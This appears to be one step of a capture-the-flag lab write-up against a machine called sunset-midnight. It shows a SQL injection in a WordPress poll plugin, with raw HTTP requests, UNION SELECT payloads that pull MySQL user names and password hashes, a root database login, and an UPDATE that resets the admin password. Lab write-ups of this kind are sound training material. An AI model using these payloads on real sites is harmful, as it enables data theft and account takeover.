# 4 :80 simply poll plugin sqli

```
Using https://www.exploit-db.com/exploits/40971

# POST http://example.com/wp-admin/admin-ajax.php
# --data="action=spAjaxResults&pollid=2"
# pollid is injectable 
# UNION query : 7 columns; 6th in injectable

# time to try it
http://sunset-midnight/wp-admin/admin-ajax.php
# capture in BURP > Repeater

GET /wp-admin/admin-ajax.php HTTP/1.1
Host: sunset-midnight
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

# response 
HTTP/1.1 400 Bad Request
Date: Wed, 25 Aug 2021 02:26:15 GMT
Server: Apache/2.4.38 (Debian)
X-Robots-Tag: noindex
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Content-Length: 1
Connection: close
Content-Type: text/html; charset=UTF-8
0

# change request method
# add POST params

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: sunset-midnight
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

action=spAjaxResults&pollid=1

# reponse
HTTP/1.1 200 OK
Date: Wed, 25 Aug 2021 02:27:14 GMT
Server: Apache/2.4.38 (Debian)
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Vary: Accept-Encoding
Content-Length: 69
Connection: close
Content-Type: text/html; charset=UTF-8

<dl class="sp-results">
	</dl>

<p class="sp-total">Total votes: </p>

# time to SQLi
action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,6,7 --
<dl class="sp-results"></dl> p class="sp-total">Total votes: 6</p>

# 6 is injectable
# db: mysql

action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,@@version,7 --
action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,version(),7 --
10.3.22-MariaDB-0+deb10u1

user()
system_user()
jose@localhost

# as we are only getting one value, will need to use sub-queries to get more information
action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,(SELECT user from mysql.user LIMIT 1,1),7 --
jose
action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,(SELECT user from mysql.user LIMIT 2,1),7 --
root
action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,(SELECT password from mysql.user LIMIT 1,1),7
*3AA64DAE22DBC5B7ACC28062EB18EFB7046D808C
action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,(SELECT password from mysql.user LIMIT 2,1),7
*A14C02465C2ED43BDB89ACC6C7213C1D00617758
# cracked: robert

@@hostname
midnight

@@datadir # location of db-files
/var/lib/mysql 

database() # current db
wordpress_db

SELECT schema_name FROM information_schema.schemata LIMIT 1,1 => mysql
SELECT schema_name FROM information_schema.schemata LIMIT 2,1 => wordpress_db
SELECT schema_name FROM information_schema.schemata LIMIT 3,1 => performance_schema

action=spAjaxResults&pollid=1 UNION SELECT 1,2,3,4,5,table_name,7 FROM information_schema.tables WHERE table_schema='wordpress_db' --
# cant seem to list tables;
# trying to login as root via mysql-client

$ mysql -h sunset-midnight -u root -p
Enter password:

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+
4 rows in set (0.083 sec)

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.084 sec)


# tried cracking but faster to update pass;

Using https://www.useotools.com/wordpress-password-hash-generator
MariaDB [wordpress_db]> UPDATE `wp_users` SET `user_pass` = '$P$B9pqm.wNYbXeVtpyQ2mbOZhnpBoYOw0' WHERE user_login = 'admin';
Query OK, 1 row affected (0.093 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```
